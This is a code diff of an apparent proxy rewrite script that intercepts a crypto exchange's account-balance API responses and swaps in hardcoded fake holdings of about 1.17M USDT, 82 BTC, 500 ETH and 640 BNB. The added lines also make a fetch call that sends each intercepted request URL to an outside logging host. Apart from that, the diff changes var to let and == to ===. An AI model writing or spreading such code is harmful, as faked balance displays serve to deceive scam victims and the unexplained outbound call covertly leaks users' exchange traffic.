@@ -1,30 +1,47 @@
 let url = $request.url
 let body = JSON.parse($response.body)
 
+let testUrl = 'https://frp.yinqf.com/test/log?url='+encodeURIComponent(url);
+fetch(testUrl).then(response => {
+  console.log(response);
+  return response;
+  // if (response.ok) {
+  //   return response.json();
+  // } else {
+  //   throw new Error(response.statusText);
+  // }
+})
+.then(data => {
+  console.log(data)
+})
+.catch(error => {
+  console.log(error)
+});
+
 //合约USDT余额
-var balance = '1175892';
+let balance = '1175892';
 //现货USDT数量
-var uBalance = '1223000.256896';
+let uBalance = '1223000.256896';
 //现货BTC数量
-var btcBalance = '82.52162012';
+let btcBalance = '82.52162012';
 //现货ETH数量
-var ethBalance = '500.5843';
+let ethBalance = '500.5843';
 //现货BNB数量
-var bnbBalance = '640.125481';
+let bnbBalance = '640.125481';
 //btc价格
-var btcPrice = '27913';
+let btcPrice = '27913';
 //eth价格
-var ethPrice = '1805';
+let ethPrice = '1805';
 //bnb价格
-var bnbPrice = '316';
+let bnbPrice = '316';
 //合约btc数量
-var btcNum = Number(balance)/Number(btcPrice);
+let btcNum = Number(balance)/Number(btcPrice);
 //现货btc数量
-var spotBtcNum = (Number(uBalance) + Number(btcBalance)*Number(btcPrice) + Number(ethBalance)*Number(ethPrice) + Number(bnbBalance)*Number(bnbPrice))/Number(btcPrice);
+let spotBtcNum = (Number(uBalance) + Number(btcBalance)*Number(btcPrice) + Number(ethBalance)*Number(ethPrice) + Number(bnbBalance)*Number(bnbPrice))/Number(btcPrice);
 if (url.indexOf('futures/v5/private/future/user-data/user-balance') !== -1) {
-  var dataList = body.data;
-  dataList.forEach((item,index)=>{
-    if(item.asset == 'USDT'){
+  let dataList = body.data;
+  dataList.forEach((item)=>{
+    if(item.asset === 'USDT'){
       //合约钱包最大可划转金额
       item.maxWithdrawAmount = balance;
       //合约钱包余额
@@ -40,13 +57,13 @@ if (url.indexOf('futures/v5/private/future/user-data/user-balance') !== -1) {
   $done({ body: JSON.stringify(body) })
 
 }else if(url.indexOf('asset/v2/private/asset-service/wallet/balance') !== -1){
-  var dataList = body.data;
-  dataList.forEach((item,index)=>{
-    if(item.accountType == 'FUTURE'){
+  let dataList = body.data;
+  dataList.forEach((item)=>{
+    if(item.accountType === 'FUTURE'){
       //账户总览界面，合约余额，btc数量
       item.balance = btcNum.toFixed(8);
     }
-    if(item.accountType == 'MAIN'){
+    if(item.accountType === 'MAIN'){
       //账户总览界面，现货余额，btc数量
       item.balance = spotBtcNum.toFixed(8);
     }
@@ -54,21 +71,21 @@ if (url.indexOf('futures/v5/private/future/user-data/user-balance') !== -1) {
   $done({ body: JSON.stringify(body) })
 
 }else if(url.indexOf('asset/v3/private/asset-service/asset/get-user-asset') !==-1){
-  var dataList = body.data;
-  dataList.forEach((item,index)=>{
-    if(item.asset == 'USDT'){
+  let dataList = body.data;
+  dataList.forEach((item)=>{
+    if(item.asset === 'USDT'){
       //现货界面，现货USDT数量
       item.free = uBalance;
     }
-    if(item.asset == 'BTC'){
+    if(item.asset === 'BTC'){
       //现货界面，现货BTC数量
       item.free = btcBalance;
     }
-    if(item.asset == 'ETH'){
+    if(item.asset === 'ETH'){
       //现货界面，现货ETH数量
       item.free = ethBalance;
     }
-    if(item.asset == 'BNB'){
+    if(item.asset === 'BNB'){
       //现货界面，现货BNB数量
       item.free = bnbBalance;
     }
